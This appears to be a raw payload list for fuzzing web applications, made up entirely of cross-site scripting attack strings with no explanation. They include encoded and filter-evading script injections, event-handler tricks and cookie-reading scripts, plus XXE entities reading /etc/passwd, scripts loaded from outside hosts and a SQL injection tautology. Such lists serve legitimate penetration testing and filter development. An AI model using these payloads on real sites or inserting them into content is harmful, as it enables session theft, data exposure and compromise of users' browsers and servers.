&kw=%27;alert%28%27XSS%27%29;//
<svg onload=\u0061lert(1)>
<script> var+x+=+showModelessDialog+(this); confirm(x.document.cookie); </script>
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>"
"""><img src=X onerror=alert(1)>"
"""><select onfocus=javascript:alert(1) autofocus>"
</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
innerHTML=location.hash>#<script>alert(1)</script>
&#60;IMG SRC &#61; &#34; j a v a s c r i p t &#58; a l e r t &#40; &#39; X S S &#39; &#41; &#34; &#62;
"&lt;IFRAME SRC=\\""javascript&#058;alert(\'XSS\');\\""&gt;&lt;/IFRAME&gt;"
"""><a href=""invalid:1"" id=x name=y>test</a><a href=""invalid:2"" id=x name=y>test</a><script>alert(x.y[0])</script>"
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>"
"&lt;STYLE&gt;@im\\port\'\\ja\\vasc\\ript&#58;alert(\\""XSS\\"")\';&lt;/STYLE&gt;"
"""><object src=1 href=1 onerror=""javascript:alert(1)""></object>"
"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>"
"""><?a foo=x=`y><img alt=""`><img src=x:x onerror=alert(3)//"">"
"&lt;BASE HREF=""javascript:alert(1);//""&gt;"
"<svg xmlns=""http://www.w3.org/2000/svg"" id=""foo""><x xmlns=""http://www.w3.org/2001/xml-events"" event=""load"" observer=""foo"" handler=""data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(1) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar""/></svg>"
</script><script>prompt(1)</script>
<%<!--'%><script>alert(1);</script -->
"&ContentID=133&SiteID=""><script>alert(String.fromCharCode(88,83,83))</script>"
">""<img src=""javascript:document.cookie=true;"">"
<script%20TEST>alert(1)</script%20TESTTEST>
<link rel=import onerror=confirm(1)>
"</title id="""">"
<xml/>&lt;/xml&gt;&lt;iframe/onload=alert(1)&gt;
"%0d%0adata:text/html;text,<svg/onload=prompt(1)>"
-1<SCRIPT <B>document.cookie=true;</SCRIPT>
&lt;BODY ONLOAD=alert('XSS')&gt;
"<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>"
"<title onmouseover=""alert(1)"">hover me</title>"
"&'"">\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u002f\u0078\u0073\u0073\u002f\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e"
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
<body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
"<IMG%20SRC=""javascript:alert('WXSS');"">"
"""><svg><![CDATA[><image xlink:href=""]]><img src=xx:x onerror=alert(2)//""></svg>"
"""'`>ABC<div style=""font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF"
'><img src=/ onerror=alert(1);>
"<pre style=line-height:1><script>d=document;for(i=1;i<4001;i++){d.write(Math.random()<.5?""\u2571"":""\u2572"");d.write(i%80?"""":""\n"")}</script>"
"</script><svg onload='-/""/-confirm(1)//'"
"<a href=""\xE1\xA0\x8Ejavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
&%27;}alert%28%27xssd%27%29;%3C/script%3E
"""><img dynsrc=""javascript:alert(1);"">"
//////////////////
&blob=%3Cbody%20onload=alert%28%22XSS%22%29%3E
<img src=foo.png onerror=alert(/xssed/) />
"<a href=""&#1;javascript:alert(1)"">CLICK ME<a>"
+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-
"<?xml version=""1.0""?><?xml-stylesheet type=""text/xml"" href=""#stylesheet""?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns=""http://www.w3.org/2000/svg"">    <xsl:stylesheet id=""stylesheet"" version=""1.0"" xmlns:xsl=""http://www.w3.org/1999/XSL/Transform"">        <xsl:template match=""/"">            <iframe xmlns=""http://www.w3.org/1999/xhtml"" src=""javascript:alert(1)""></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill=""red"" r=""40""></circle></svg>"
<svg/onload=setTimeout`alert\`1\``>
<<SCRIPT>%(payload)s//<</SCRIPT>
"<IMG SRC=""javascript:javascript:alert(1)"""
&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
"&lt;TABLE BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;"
"""><img src=""blah>"" onmouseover=""alert(1);"">"
"<IMG SRC=javascript:confirm(String.fromCharCode(88,83,83))>"
&query=Search+RMRS...%22%3E%3Cscript%3E%2B-%2B-1-%2B-%2Balert%28%2FXSSPOSED%2F%29%3C%2Fscript%3E
<a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>
"<iframe onload=""(function*(){}).constructor('alert(location)')().next()"">"
"<a href=""\\xE2\\x80\\x82javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    confirm(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #"
"<img src=""javascript:alert('XSS')"">"
<embed/src=//goo.gl/nlX0P>
"[A]<? foo=""><script>alert(1)</script>""><! foo=""><script>alert(1)</script>""></ foo=""><script>alert(1)</script>"">[B]<? foo=""><x foo=\'?><script>alert(1)</script>\'>"">[C]<! foo=""[[[x]]""><x foo=""]foo><script>alert(1)</script>"">[D]<% foo><x foo=""%><script>alert(1)</script>"">"
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>"
\u003cscript\u003econfirm(\u0027XSS\u0027)\u003c/script\u003e
"""><body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>"
"-1<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
"""><x onload'=alert(1)"
"'><img src=\""x:X\"" onerror=\""alert(1)\"">"
"<form id=""test"" /><button form=""test"" formaction=""javascript:alert(123)"">TESTHTML5FORMACTION"
&config=htdig&amp;restrict=&amp;exclude=&amp;method=and&amp;format=long&amp;sort=score&amp;words=%22%3E%20d%3Csvg/onload=confirm%28/xssposed/%29%3E
<div onactivate=alert('Xss') id=xss style=overflow:scroll>
"""><SCRIPT>alert(1);</SCRIPT>"
&#X0003C
javascript:\u0070rompt&#x28;1&#x29;
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>"
Ã»scriptualert(EXSSE)Ã»/scriptu
javascript:prompt(/XSS/.source);var x = prompt;x(0);x(/XSS/.source);x
<svg/onload=parent[/loca/.source%2b/tion/.source]=name//
"<IMG+LOWSRC=""javascript:alert(1);"">"
"""><BODY BACKGROUND=""javascript:alert(1)"">"
"<form><button formaction=""javascript:javascript:alert(1)"">X"
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>"
<script>document.cookie=true;//--></script>
<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> â€‹
"0&q=\';alert(String.fromCharCode(88,83,83))//\\\';alert%2?8String.fromCharCode(88,83,83))//"";alert(String.fromCharCode?(88,83,83))//\\"";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>"">\'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search"
\\'); alert(\'xss\');var x=\'
"&iama=' onmouseover='alert(""XSS"")' style=""position:absolute;top:0;left:0;width:100%;height:100%;background:url('http://is.gd/rc7syX')"" name='"
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>"
&keys=%27%22%3E%3C%2Ftitle%3E%3Cscript%3E+alert%28%22XSSPOSED%22%29%3C%2Fscript%3E%3E%2F
"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>â€‹"
"&productPageUrl=""><script>alert(String.fromCharCode(88,83,83))</script>"
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>"
"""<A HREF=""""http://0102.0146.0007.00000223/"""">XSS</A>"""
'><input autofocus onfocus=alert(1)>
"<IMG%20SRC=""javascript:alert('WXSS')"""
"<script>$=~[];$={___:++$,$$$$:(![]+"""")[$],__$:++$,$_$_:(![]+"""")[$],_$_:++$,$_$$:({}+"""")[$],$$_$:($[$]+"""")[$],_$$:++$,$$$_:(!""""+"""")[$],$__:++$,$_$:++$,$$__:({}+"""")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"""")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"""")[$.__$])+((!$)+"""")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""""+"""")[$.__$])+($._=(!""""+"""")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""""+"""")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+""\""""+$.$_$_+(![]+"""")[$._$_]+$.$$$_+""\\""+$.__$+$.$$_+$._$_+$.__+""(""+$.___+"")""+""\"""")())();</script>"
"""><script>alert(1)</script>"
&#60;XSS STYLE&#61;&#34;behavior&#58; url&#40;http&#58;&#47;&#47;testsite.com&#47;xss.htc&#41;&#59;&#34;&#62;
"'alert(1)'.replace(/.+/,eval)"
"'"">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>"
"<xml id=""xss"" src=""test.htc""></xml><label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>"
"var str = ""jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"";"
&id=101;alert('xss')
"<LAYER SRC=""javascript:alert(1);""></LAYER>"
"<img \x12src=x onerror=""javascript:alert(1)"">"
&s=%3Cscript%3Ealert(0)%3C/script%3E
<body onload=alert(1)>
<a href='javascript:http://@cc_on/confirm%28location%29'>click</a>
toJSON=alert;JSON.stringify(window);
&q=%3Cscript%3Ealert(0);%3C/script%3E&hobSearch.x=0&hobSearch.y=0
"<img src=x on*chr*Error=""javascript:log(*num*)""/>"
<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
"<TABLE><TD BACKGROUND=""javascript:document.cookie=true;"">"
'><input+onfocus=alert(1)>
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>"
"ABC<div style=""x:\xE2\x80\x8Bexpression(javascript:alert(1)"">DEF"
<img src=/ onerror=alert(1)>
<x%0Conxxx=1
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(1)&gt;>
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>
"<META HTTP-EQUIV=""Link"" Content=""<javascript:confirm(document.location)>; REL=stylesheet"">"
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>"
"""><div style=""width: expression(alert(1););"">"
"<var onmouseover=""prompt(1)"">On Mouse Over</var>?"
"<script>execScript(â€œMsgBox 1â€,â€vbscriptâ€);</script>"
&lt;/BODY&gt;&lt;/HTML&gt;
<svg><script>alert&#40 1&#41
><body/onload=&lt;!--&gt;&#10confirm(1);prompt(/XSS/.source)>
1';alert(/XSS/);x='1
'><frameset onload=prompt(1)>
"<IMG LOWSRC=""javascript:document.cookie=true;"">"
setTimeout(location.search.slice(1));
width:expression\28 prompt \28 1 \29 \29
"[color=red' onmouseover=""alert('xss')""]mouse over[/color]"
>>alert(1)>>
"<!--#echo var=""DOCUMENT_NAME"" -->"
"""><input type=""image"" formaction=JaVaScript:alert(0)>"
"&searchinput=alert(0);</script>"">'><script>alert(0);</script>"
"<!DOCTYPE xxe [<!ENTITY foo ""aaaaaa"">]><root>&foo;</root>"
with(document)alert(cookie)
'-alert(1)-'
"""/><script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F"
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />"
"&q=<script>alert%28""XSS""%29</script>"
"<div contextmenu=""xss"">Right-Click Here<menu id=""xss"" onshow=""alert(1)"">"
&<script>alert(1)</script>
"<STYLE>li {list-style-image: url(""javascript:document.cookie=true;"");</STYLE><UL><LI>CrossSiteScripting"
"'><BASE HREF=""javascript:alert(1);//"">"
"""><img/â€onerror=alert(1) src=a>"
'><script a b c >alert(1)</script d e f>
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
charset=utf- 32&v=%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foof>"
""";alert('XSS');//"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://127.0.0.1:80"" >]>"
"\"";alert('XSS');//"
"&lt;XSS STYLE=\\""behavior&#58; url(xss&#46;htc);\\""&gt;"
"'><head><base href=""javascript://""/></head><body><a href=""/. /,alert(1)//#"">XXX</a></body>"
<sc<script>ript>alert(123)</sc</script>ript>
&lt;/BODY&gt;&lt;/HTML&gt;
&keyword=XSS%22autofocus%2FXSS%2Fonfocus%3D%22alert%28%2FXSSPOSE%2F%29
'><script itworksinallbrowsers>/*<script* */alert(1)</script â€‹
&#x03c
"""`\'><script>\\x7Ejavascript:alert(1)</script>"
'><img onerror=â€alert(1)â€src=a>
\x3Cscript\x3Ealert(document.domain);\x3C\x2Fscript\x3E
"<iframe name=alert(1) src=""//somedomain?x=',__defineSetter__('x',eval),x=name,'""></iframe>"
"<SCRIPT>document.write(""XSS"");</SCRIPT>"
<img src=xx:xx onerror=window[['logChr*chr*']](*num*)>
&#x3c;
"<meta http-equiv=Set-Cookie content=""testmqjq=1926"">"
<body/onload=&lt;!--&gt;&#10confirm(1)>
</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert(\'XSS\');"">"
"""<div style=""""binding: url([link to code]);"""">"""
<embed src=%(jscript)s></embed>
<%78 onxxx=1
"""<FRAMESET><FRAME SRC=""""javascript:alert('XSS');""""></FRAMESET>"""
"""><img[%09]onerror=alert(1) src=a>"
"<a href=""\x05javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<br size=""&{alert('XSS')}"">"
><scri%00pt>confirm(0);</scri%00pt>
&q=%22%2balert%28%22XSS%22%29%2b%22&ref=index
*/a=eval;b=alert;a(b(/e/.source));/*
'><b><script<b></b><alert(1)</script </b></b>
"""></script ""/*'/*><svg */; onload=alert(1) //>"
jAvAsCrIpT&colon;prompt&lpar;1&rpar;
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { confirm(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>"
<script>parent.location.replace('javascript:alert(document.domain)')</script>
"<a href=""\x0Ajavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>"
"<?xml-stylesheet href=""javascript:alert(1)""?><root/>"
&id=11
<a href=``calc``>
"""><p/onmouseover=javascript:alert(1); >X</p>"
"<base href=data:/,0/><script src=alert(1)></script>"
"""><?xml-stylesheet type=""text/xsl"" href=""#"" ?> <stylesheet xmlns=""http://www.w3.org/TR/WD-xsl""> <template match=""/""> <eval>new ActiveXObject(&apos;htmlfile&apos;).parentWindow.alert(1)</eval> <if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if> </template> </stylesheet>"
"""><script itworksinallbrowsers>/*<script* */alert(1)</script"
"`'""><script>window['log*chr*'](*num*)</script>"
â€œ;alert(1)//
<body/onload=&lt;!--&gt;&#10alert(1)>
"><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"""
"'><svg xmlns=""http://www.w3.org/2000/svg""><g onload=""javascript:alert(1)""></g></svg"
<svg><script>alert&grave;1&grave;<p>
'><<script>alert(1);</script>
"""><img src=a onerror=alert(1)"
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<svg/contentScriptType=text/vbs><script>Execute(MsgBox(chr(75)&chr(67)&chr(70)))
"""<prompt(9)<"""
[a](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29)
"""><form name=self location=""javascript:alert(1)"""
"<video onerror=""alert(1)""><source></source></video>"
"<xmp><img alt=""</xmp><img src=xx:x onerror=confirm(1)//"">"
"<style onload='execScript(/**/""\x61lert&#40 1&#41"",""j\x61vascript"");'>"
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]><foo>&xxe;</foo>"
"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>"
<input onfocus=write(1) autofocus>
<img src=`xx:xx` onerror=confirm(/XSS/.source);confirm(1)>
<select onclick=popup=1;>
"<ScRIPt<aLeRT(String.fromCharCode(75,67,70))</ScRIPt>"
'><IMG ONERROR=â€VBS:MSGBOX 1â€ SRC=A>
<script>a = {get[alert`1`](){}}</script>
"<a href=""jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e"">click me</a>"
"""/><svg><script>//&NewLine;confirm(1);</script </svg>"
"""><svg onload=\u0061lert(1)>"
"<!DOCTYPE html PUBLIC """" """"><style xmlns=""http://www.w3.org/1999/xhtml "">*{animation-name:a}@-ms-keyframes a{0%{font:menu"
"<bgsound+src=""javascript:alert(1);"">"
"<html onMouseEnter html onMouseEnter=""javascript:parent.javascript:alert(1)""></html onMouseEnter>"
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
"a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))"
"<form id=""test""></form><button form=""test"" formaction=""javascript:alert(1)"">X</button>"
<marquee/onstart=this['innerHTML']=unescape(location.hash);>//#<img src=x onerror=alert(document.domain)>
"<script>a=""<%""//</script>alert(1)//%></script>"
"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>"
<a onmouseover=location='&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#10 1&#114&#116&#40&#49&#41'>a<a>
"<IMG SRC=""mocha:[code]"">"
<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">X</A>"
&q=%3Cscript%3Ealert%28%27X-D+xss+again+%3A-%28%27%29%3C%2Fscript%3E&xsubmit=Search
"<form action=""Javascript:alert(1)""><input type=submit>"
&#X3c
